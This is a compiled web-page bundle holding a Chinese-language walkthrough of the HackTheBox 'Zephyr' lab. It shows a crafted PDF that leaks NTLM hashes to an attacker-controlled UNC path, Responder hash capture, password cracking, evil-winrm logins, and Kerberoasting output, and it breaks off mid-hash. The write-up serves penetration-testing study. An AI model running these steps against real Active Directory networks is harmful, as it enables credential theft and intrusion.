"use strict";(self.webpackChunkrookie=self.webpackChunkrookie||[]).push([[901],{8031:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>r,contentTitle:()=>o,default:()=>p,frontMatter:()=>d,metadata:()=>i,toc:()=>t});var s=a(4848),c=a(8453);const d={toc_max_heading_level:6},o="Zephyr",i={id:"\u9776\u573a/HTB-prolabs/Zephyr",title:"Zephyr",description:"\u573a\u666f\u63cf\u8ff0",source:"@site/docs/\u9776\u573a/HTB-prolabs/Zephyr.md",sourceDirName:"\u9776\u573a/HTB-prolabs",slug:"/\u9776\u573a/HTB-prolabs/Zephyr",permalink:"/S0rry/docs/\u9776\u573a/HTB-prolabs/Zephyr",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{toc_max_heading_level:6},sidebar:"BC_Sidebar",previous:{title:"HTB-prolabs",permalink:"/S0rry/docs/category/htb-prolabs"}},r={},t=[{value:"\u573a\u666f\u63cf\u8ff0",id:"\u573a\u666f\u63cf\u8ff0",level:2},{value:"\u7f51\u7edc\u62d3\u6251\u53ca\u653b\u51fb\u624b\u6cd5",id:"\u7f51\u7edc\u62d3\u6251\u53ca\u653b\u51fb\u624b\u6cd5",level:2},{value:"10.10.110.0/24(nmap)",id:"1010110024nmap",level:2},{value:"10.10.110.35(\u5165\u53e3\u673a\u3001\u7f51\u5361\u4e00\\mail)",id:"101011035\u5165\u53e3\u673a\u7f51\u5361\u4e00mail",level:3},{value:"badpdf",id:"badpdf",level:4},{value:"\u95ee\u7b54\u73af\u8282",id:"\u95ee\u7b54\u73af\u8282",level:4},{value:"\u53d1\u73b0\u5185\u7f51\u6bb5192.168.110.*",id:"\u53d1\u73b0\u5185\u7f51\u6bb5192168110",level:4},{value:"arp\u55c5\u63a2",id:"arp\u55c5\u63a2",level:5},{value:"192.168.110.56(WKST)",id:"19216811056wkst",level:2},{value:"\u5c1d\u8bd5\u4f7f\u7528\u57df\u5185\u7528\u6237riley\u767b\u9646",id:"\u5c1d\u8bd5\u4f7f\u7528\u57df\u5185\u7528\u6237riley\u767b\u9646",level:3},{value:"bloodhound\u4fe1\u606f\u6536\u96c6",id:"bloodhound\u4fe1\u606f\u6536\u96c6",level:2},{value:"\u4f7f\u7528riley(\u57df\u7528\u6237)\u8bbf\u95eeldap",id:"\u4f7f\u7528riley\u57df\u7528\u6237\u8bbf\u95eeldap",level:3},{value:"kerberoasting\u653b\u51fb",id:"kerberoasting\u653b\u51fb",level:3},{value:"GetUserspn\u83b7\u53d6spn\u548chash",id:"getuserspn\u83b7\u53d6spn\u548chash",level:4},{value:"\u83b7\u53d6spn",id:"\u83b7\u53d6spn",level:5},{value:"blake\u7684hash",id:"blake\u7684hash",level:5},{value:"web_svc\u7684hash",id:"web_svc\u7684hash",level:5},{value:"192.168.110.52(nmap\\web_svc)",id:"19216811052nmapweb_svc",level:2},{value:"\u5bc6\u7801\u767b\u9646",id:"\u5bc6\u7801\u767b\u9646",level:3},{value:"\u62d6hash\u503c",id:"\u62d6hash\u503c",level:3},{value:"\u8fdc\u7a0b\u62d6(445\u5f00\u653e)",id:"\u8fdc\u7a0b\u62d6445\u5f00\u653e",level:4},{value:"\u672c\u5730\u62d6",id:"\u672c\u5730\u62d6",level:4},{value:"192.168.110.53(nmap\\james)",id:"19216811053nmapjames",level:2},{value:"PTH\u767b\u9646",id:"pth\u767b\u9646",level:3},{value:"\u5206\u6790bloodhound",id:"\u5206\u6790bloodhound",level:3},{value:"ForceChangePassword",id:"forcechangepassword",level:4},{value:"192.168.110.54(nmap\\blake)",id:"19216811054nmapblake",level:2},{value:"\u5bc6\u7801\u767b\u9646",id:"\u5bc6\u7801\u767b\u9646-1",level:3},{value:"\u62d6\u53d6hash",id:"\u62d6\u53d6hash",level:4},{value:"\u53d1\u73b0\u59d4\u6d3e(\u53d7\u534f\u8bae\u8f6c\u6362\u7ea6\u675f)",id:"\u53d1\u73b0\u59d4\u6d3e\u53d7\u534f\u8bae\u8f6c\u6362\u7ea6\u675f",level:4},{value:"192.168.110.55",id:"19216811055",level:2},{value:"GetST.py",id:"getstpy",level:3},{value:"PTT\u767b\u9646",id:"ptt\u767b\u9646",level:3},{value:"\u62d6\u53d6hash",id:"\u62d6\u53d6hash-1",level:3}];function b(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",h5:"h5",img:"img",mdxAdmonitionTitle:"mdxAdmonitionTitle",p:"p",pre:"pre",...(0,c.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"zephyr",children:"Zephyr"}),"\n",(0,s.jsx)(n.h2,{id:"\u573a\u666f\u63cf\u8ff0",children:"\u573a\u666f\u63cf\u8ff0"}),"\n",(0,s.jsx)(n.h2,{id:"\u7f51\u7edc\u62d3\u6251\u53ca\u653b\u51fb\u624b\u6cd5",children:"\u7f51\u7edc\u62d3\u6251\u53ca\u653b\u51fb\u624b\u6cd5"}),"\n",(0,s.jsx)(n.h2,{id:"1010110024nmap",children:"10.10.110.0/24(nmap)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# nmap 10.10.110.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 08:01 CST\nNmap scan report for bogon (10.10.110.2)\nHost is up (0.40s latency).\nAll 1000 scanned ports on bogon (10.10.110.2) are in ignored states.\nNot shown: 1000 filtered tcp ports (no-response)\n\nNmap scan report for painters.htb (10.10.110.35)\nHost is up (0.27s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n\nNmap done: 256 IP addresses (2 hosts up) scanned in 87.62 seconds\n"})}),"\n",(0,s.jsx)(n.h3,{id:"101011035\u5165\u53e3\u673a\u7f51\u5361\u4e00mail",children:"10.10.110.35(\u5165\u53e3\u673a\u3001\u7f51\u5361\u4e00\\mail)"}),"\n",(0,s.jsx)(n.p,{children:"\u8be6\u7ec6\u7248\u672c\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop/Bad-Pdf]\n\u2514\u2500# nmap -sV -sC -p22,80,445 10.10.110.35\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 08:55 CST\nNmap scan report for painters.htb (10.10.110.35)\nHost is up (0.20s latency).\n\nPORT    STATE    SERVICE      VERSION\n22/tcp  open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 91:ca:e7:7e:99:03:a9:78:e8:86:2e:e8:cc:2b:9f:08 (RSA)\n|   256 b1:7f:c0:06:9b:e7:08:b4:6a:ab:bd:c2:96:04:23:49 (ECDSA)\n|_  256 0d:3b:89:bc:d5:a4:35:e0:dd:c4:22:14:7a:48:ad:7c (ED25519)\n80/tcp  open     http         nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to https://painters.htb/home\n445/tcp filtered microsoft-ds\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsxs)(n.admonition,{type:"warning",children:[(0,s.jsx)(n.mdxAdmonitionTitle,{}),(0,s.jsxs)(n.p,{children:["\u56e0\u4e3a\u8bbf\u95ee10.10.110.35\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u89e3\u6790\u6210",(0,s.jsx)(n.code,{children:"https://painters.htb/home"}),"\u5bfc\u81f4\u4e0d\u80fd\u8fde\u63a5\u670d\u52a1\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u628a\u57df\u540d\u548cip\u7ed1\u5b9a\uff0c\u5373hosts  -> 10.10.110.35 painters.htb"]})]}),"\n",(0,s.jsxs)(n.p,{children:["vacancies\n",(0,s.jsx)(n.img,{alt:"alt text",src:a(5823).A+"",width:"2289",height:"1310"}),"\n\u53d1\u73b0\u53ef\u4ee5\u4e0a\u4f20pdf\n",(0,s.jsx)(n.img,{alt:"alt text",src:a(4061).A+"",width:"2255",height:"1246"})]}),"\n",(0,s.jsxs)(n.admonition,{type:"tip",children:[(0,s.jsx)(n.mdxAdmonitionTitle,{}),(0,s.jsx)(n.p,{children:"\u7ecf\u8fc7Lamber\u63d0\u9192\uff0c\u6240\u4ee5\u77e5\u9053bad-pdf\u9493\u9c7c\u65b9\u6cd5\u8fdb\u884c\u653b\u51fb"})]}),"\n",(0,s.jsx)(n.h4,{id:"badpdf",children:"badpdf"}),"\n",(0,s.jsxs)(n.p,{children:["GitHub\u5bfb\u627e\u9879\u76ee",(0,s.jsx)(n.code,{children:"https://github.com/deepzec/Bad-Pdf"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop/Bad-Pdf]\n\u2514\u2500# cat hf.pdf                                                \n\n%PDF-1.7\n\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>\nendobj\nxref\n0 4\n0000000000 65535 f\n0000000015 00000 n\n0000000060 00000 n\n0000000111 00000 n\ntrailer\n<</Size 4/Root 1 0 R>>\nstartxref\n190\n3 0 obj\n<< /Type /Page\n   /Contents 4 0 R\n\n   /AA <<\n           /O <<\n              /F (\\\\\\\\10.10.14.9\\\\test)\n                  /D [ 0 /Fit]\n                  /S /GoToE\n                  >>\n\n           >>\n\n           /Parent 2 0 R\n           /Resources <<\n                        /Font <<\n                                /F1 <<\n                                        /Type /Font\n                                        /Subtype /Type1\n                                        /BaseFont /Helvetica\n                                        >>\n                                  >>\n                                >>\n>>\nendobj\n\n\n4 0 obj<< /Length 100>>\nstream\nBT\n/TI_0 1 Tf\n14 0 0 14 10.000 753.976 Tm\n0.0 0.0 0.0 rg\n(PDF Document) Tj\nET\nendstream\nendobj\n\n\ntrailer\n<<\n        /Root 1 0 R\n>>\n\n%%EOF\n\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsxs)(n.p,{children:["\u672c\u8d28\u662fhr\u5728\u5e26\u6709\u8001\u7248\u672c\u7684adobe\u57df\u5185\u70b9\u51fb\u4e86badpdf\uff0c\u5bfc\u81f4NTLMv2-SSP Hash\u53d1\u9001\u5230",(0,s.jsx)(n.code,{children:"\\\\\\\\10.10.14.9\\\\test"}),",\u6240\u4ee5\u6211\u4eec\u5f00\u59cb\u76d1\u542c\u5c31\u597d\u4e86"]})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"player@HTB-pro-labs:~$ sudo /root/github/Responder/Responder.py -I tun0 -F -v\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.4.0\n\n  To support this project:\n  Github -> https://github.com/sponsors/lgandx\n  Paypal  -> https://paypal.me/PythonResponder\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    MDNS                       [ON]\n    DNS                        [ON]\n    DHCP                       [OFF]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    MQTT server                [ON]\n    RDP server                 [ON]\n    DCE-RPC server             [ON]\n    WinRM server               [ON]\n    SNMP server                [OFF]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [OFF]\n    Force WPAD auth            [ON]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Force ESS downgrade        [OFF]\n\n[+] Generic Options:\n    Responder NIC              [tun0]\n    Responder IP               [10.10.14.9]\n    Responder IPv6             [dead:beef:2::1007]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']\n    TTL for poisoned response  [default]\n\n[+] Current Session Variables:\n    Responder Machine Name     [WIN-MHEQOF5VP8L]\n    Responder Domain Name      [PO9L.LOCAL]\n    Responder DCE-RPC Port     [48062]\n\n[+] Listening for events...\n\n[!] Error starting SSL server on port 5986, check permissions or other servers running.\n[!] Error starting SSL server on port 443, check permissions or other servers running.\n[!] Error starting SSL server on port 636, check permissions or other servers running.\n[SMB] NTLMv2-SSP Client   : 10.10.110.35\n[SMB] NTLMv2-SSP Username : PAINTERS\\riley\n[SMB] NTLMv2-SSP Hash     : riley::PAINTERS:53c64658d8d385f2:D5400AE66AF0FEAA810A5BA5D28C2E3F:010100000000000080D5D41498B5DA015CFAE691A8785C93000000000200080050004F0039004C0001001E00570049004E002D004D004800450051004F00460035005600500038004C0004003400570049004E002D004D004800450051004F00460035005600500038004C002E0050004F0039004C002E004C004F00430041004C000300140050004F0039004C002E004C004F00430041004C000500140050004F0039004C002E004C004F00430041004C000700080080D5D41498B5DA01060004000200000008003000300000000000000000000000002000009362064276D8FE84BF59334519405635765FD93A3A806E37B16B1DF51AF65E190A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0039000000000000000000\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u62ff\u5230hash\u7684\u65f6\u5019\u7b2c\u4e00\u65f6\u95f4\u5c31\u60f3\u5230\u7206\u7834"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(rookie\u327fRookie)-[~/Desktop]\n\u2514\u2500$ john aaa -wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 16 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nP@ssw0rd         (riley)     \n1g 0:00:00:00 DONE (2024-06-03 17:56) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed.\n"})}),"\n",(0,s.jsx)(n.h4,{id:"\u95ee\u7b54\u73af\u8282",children:"\u95ee\u7b54\u73af\u8282"}),"\n",(0,s.jsx)(n.admonition,{title:"\u95ee\u9898",type:"danger",children:(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"1\u3001\u5728Linux\u7684web\u7f51\u9875\uff0c\u4e3a\u4ec0\u4e48\u4f1a\u53cd\u5f39\u51faNTLMv2-SSP Hash \n2\u3001\u4e3a\u4ec0\u4e48Linux\u7528NTLMv2-SSP Hash\u7684\u8d26\u6237\u5bc6\u7801\u767b\u9646\n"})})}),"\n",(0,s.jsx)(n.admonition,{title:"\u56de\u7b54",type:"tip",children:(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"1\u3001web\u7f51\u9875\u53ea\u8d1f\u8d23\u6536\u96c6pdf\uff0c\u800chr\u5de5\u4f5c\u7684\u5730\u65b9\u662fWindows\u73af\u5883\uff0chr\u5728\u57df\u5185\u70b9\u51fb\u67e5\u770b\n2\u3001\u5bc6\u7801\u590d\u7528\uff0c\u662f\u57df\u5185\u5f88\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u6cd5\n"})})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u767b\u9646"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop/Bad-Pdf]\n\u2514\u2500# ssh riley@10.10.110.35 \nriley@10.10.110.35's password: P@ssw0rd\n\nriley@mail:~$ ls\nagent  flag.txt  nmap \nriley@mail:~$ cat flag.txt \nZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}  #\u4eba\u7c7b\u7684\u9519\u8bef\u662f\u81f4\u547d\u7684\n"})}),"\n",(0,s.jsx)(n.h4,{id:"\u53d1\u73b0\u5185\u7f51\u6bb5192168110",children:"\u53d1\u73b0\u5185\u7f51\u6bb5192.168.110.*"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"riley@mail:~$ ifconfig\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.110.51  netmask 255.255.255.0  broadcast 192.168.110.255\n        inet6 fe80::250:56ff:fe94:c339  prefixlen 64  scopeid 0x20<link>\n        ether 00:50:56:94:c3:39  txqueuelen 1000  (Ethernet)\n        RX packets 39041  bytes 32330274 (32.3 MB)\n        RX errors 0  dropped 51  overruns 0  frame 0\n        TX packets 33522  bytes 16083072 (16.0 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 32560  bytes 2332756 (2.3 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 32560  bytes 2332756 (2.3 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n"})}),"\n",(0,s.jsx)(n.h5,{id:"arp\u55c5\u63a2",children:"arp\u55c5\u63a2"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"riley@mail:~$ arp -a\n? (192.168.110.56) at 00:50:56:b9:84:a9 [ether] on eth0\n? (192.168.110.53) at 00:50:56:b9:aa:8d [ether] on eth0\n? (192.168.110.52) at 00:50:56:b9:dc:9e [ether] on eth0\n? (192.168.110.55) at 00:50:56:b9:75:58 [ether] on eth0\n? (192.168.110.54) at 00:50:56:b9:cc:cd [ether] on eth0\n_gateway (192.168.110.1) at 00:50:56:b9:fb:40 [ether] on eth0\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u53d1\u73b0\u5982\u4e0bip"}),"\n",(0,s.jsx)(n.admonition,{type:"info",children:(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"192.168.110.1  (firewall)\n192.168.110.51 (\u5165\u53e3\u673a\u3001\u7f51\u5361\u4e8c)\n192.168.110.52\n192.168.110.53\n192.168.110.54\n192.168.110.55\n192.168.110.56\n"})})}),"\n",(0,s.jsx)(n.h2,{id:"19216811056wkst",children:"192.168.110.56(WKST)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'riley@mail:~$ ./nmap -Pn -T4 -sT --min-rate="1000" -p-  192.168.110.56\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-05 06:33 UTC\nUnable to find nmap-services!  Resorting to /etc/services\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for 192.168.110.56\nHost is up (0.00056s latency).\nNot shown: 65534 filtered ports\nPORT     STATE SERVICE\n5985/tcp open  unknown\n'})}),"\n",(0,s.jsx)(n.h3,{id:"\u5c1d\u8bd5\u4f7f\u7528\u57df\u5185\u7528\u6237riley\u767b\u9646",children:"\u5c1d\u8bd5\u4f7f\u7528\u57df\u5185\u7528\u6237riley\u767b\u9646"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# proxychains evil-winrm -u riley -p P@ssw0rd  -i 192.168.110.56\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n                                        \nEvil-WinRM shell v3.5\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n[proxychains] Strict chain  ...  192.248.165.125:58888  ...  192.168.110.56:5985  ...  OK\n*Evil-WinRM* PS C:\\Users\\riley\\Documents>\n*Evil-WinRM* PS C:\\Users\\riley\\Documents> cd ../../Administrator/Desktop\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> type flag.txt\nZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"bloodhound\u4fe1\u606f\u6536\u96c6",children:"bloodhound\u4fe1\u606f\u6536\u96c6"}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"\u5982\u4e0b,\u5728\u4fe1\u606f\u6536\u96c6\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4e0a\u4f20\u5185\u7a7f\u5de5\u5177,\u6211\u4eec\u4f7f\u7528scp\u662f\u652f\u6301ssh\u7aef\u53e3\u4f20\u8f93\u7684"}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# scp /home/rookie/Desktop/chisel  riley@10.10.110.35:/home/riley/    \n\nriley@10.10.110.35's password: \nchisel                                                                                             100% 8452KB 498.8KB/s   00:16    \n\n"})})]}),"\n",(0,s.jsx)(n.h3,{id:"\u4f7f\u7528riley\u57df\u7528\u6237\u8bbf\u95eeldap",children:"\u4f7f\u7528riley(\u57df\u7528\u6237)\u8bbf\u95eeldap"}),"\n",(0,s.jsx)(n.p,{children:"ldap(\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# proxychains ./rusthound -d painters.htb -i 192.168.110.55 -u 'riley@painters.htb' -p 'P@ssw0rd'\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n---------------------------------------------------\nInitializing RustHound at 16:08:27 on 06/13/24\nPowered by g0h4n from OpenCyber\n---------------------------------------------------\n\n[2024-06-13T08:08:27Z INFO  rusthound] Verbosity level: Info\n[proxychains] Strict chain  ...  192.248.165.125:59000  ...  192.168.110.55:389  ...  OK\n[2024-06-13T08:08:28Z INFO  rusthound::ldap] Connected to PAINTERS.HTB Active Directory!\n[2024-06-13T08:08:28Z INFO  rusthound::ldap] Starting data collection...\n[2024-06-13T08:08:29Z INFO  rusthound::ldap] All data collected for NamingContext DC=painters,DC=htb\n[2024-06-13T08:08:29Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...\n[2024-06-13T08:08:29Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10\n[2024-06-13T08:08:29Z INFO  rusthound::json::parser] Parsing LDAP objects finished!\n[2024-06-13T08:08:29Z INFO  rusthound::json::checker] Starting checker to replace some values...\n[2024-06-13T08:08:29Z INFO  rusthound::json::checker] Checking and replacing some values finished!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 12 users parsed!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_users.json created!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 60 groups parsed!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_groups.json created!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 6 computers parsed!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_computers.json created!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 1 ous parsed!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_ous.json created!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 1 domains parsed!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_domains.json created!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 2 gpos parsed!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_gpos.json created!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] 21 containers parsed!\n[2024-06-13T08:08:29Z INFO  rusthound::json::maker] .//20240613160829_painters-htb_containers.json created!\n\nRustHound Enumeration Completed at 16:08:29 on 06/13/24! Happy Graphing!\n"})}),"\n",(0,s.jsx)(n.h3,{id:"kerberoasting\u653b\u51fb",children:"kerberoasting\u653b\u51fb"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"alt text",src:a(2990).A+"",width:"2187",height:"1199"})}),"\n",(0,s.jsx)(n.h4,{id:"getuserspn\u83b7\u53d6spn\u548chash",children:"GetUserspn\u83b7\u53d6spn\u548chash"}),"\n",(0,s.jsx)(n.p,{children:"spn\u662f\u670d\u52a1\u4e3b\u4f53\u540d\u79f0"}),"\n",(0,s.jsx)(n.h5,{id:"\u83b7\u53d6spn",children:"\u83b7\u53d6spn"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/\u2026/Desktop/github/impacket/examples]\n\u2514\u2500# proxychains python  GetUserSPNs.py -dc-ip 192.168.110.55 -target-domain painters.htb painters.htb/riley:P@ssw0rd\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0.dev1+20240507.102706.4e3e668a - Copyright 2023 Fortra\n\n[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:389  ...  OK\nServicePrincipalName   Name     MemberOf  PasswordLastSet             LastLogon                   Delegation  \n---------------------  -------  --------  --------------------------  --------------------------  -----------\nHTTP/dc.painters.htb   blake              2024-06-14 05:56:29.800756  2024-06-14 06:00:40.747333  constrained \nHTTP/svc.painters.htb  web_svc            2023-05-24 14:50:47.043365  2024-06-13 21:19:51.683396 \n"})}),"\n",(0,s.jsx)(n.h5,{id:"blake\u7684hash",children:"blake\u7684hash"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/\u2026/Desktop/github/impacket/examples]\n\u2514\u2500# proxychains python  GetUserSPNs.py -dc-ip 192.168.110.55 -target-domain painters.htb painters.htb/riley:P@ssw0rd -request-user blake\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0.dev1+20240507.102706.4e3e668a - Copyright 2023 Fortra\n\n[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:389  ...  OK\nServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon                   Delegation  \n--------------------  -----  --------  --------------------------  --------------------------  -----------\nHTTP/dc.painters.htb  blake            2024-06-14 05:56:29.800756  2024-06-14 06:00:40.747333  constrained \n\n\n\n[-] CCache file is not found. Skipping...\n[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK\n$krb5tgs$23$*blake$PAINTERS.HTB$painters.htb/blake*$401c17fd1b2c3f14e4140a553e2b6d42$1aa1caa1dfc49df5d2047267b06adfc9bcc7f03f249836a979fa5d51ae59cc02d7bfa4e4c63ff47d771f0d35ccff7d180ef538405df9bd4a67eea9b13f10e31de5b5db0a9366ae0ccd6df8ad294584c1745a1a75dd53ba1cb51b4a49f792a3ca0d69f5890db29cfb089775f7f468551aa4221706d6c0d6e723547b0da70053533185f1b90eaa1344190fe3532b15573c7e6b972e11713f005742b0e5575b2766fd0d2cb8e1a1c4e63b67342261b1cae8f03e94ae989181938d282cd8d2e0dad2e9f168d3346efca47af4f2eec4307c9bfafac0662b4140449f4be2952d7ccbe4adc142ea6652119b8b69538d7179756bbd5f7d068971488e657480cbfcf6dcea86601a14ff6d71f41b8bea5b4cba2b287cabe1d93b7d1a2da84e7b313b8163ce624159cd700681cdb417650ad99a6250d2410f38774f627ee386b5f6be10857f8bafab4a14dc92b13334e681f6633d9f03c2f9e3cbf7c31e8c41f7cb6c01a7cbf448e445c151af463cf739c6092de71a6739ee83b3976f16c4a1ded6bf3d835874565be200845cb98022b6d0f5f9b51996a059ce99cd0987434b104430ee6c47a63ec77ded9abf9c568cee07f05cda02528bda466ecb1ff6462041d2be3b6b66a9bf754868714ebad73b106a83fa61a3a2906630cede73f04fc4f875a67508fb76a2085186ab42dfae9c6f843b9553830fa2aadd22c289a33387384987a6bf883d8d872353852589cc3c74ed8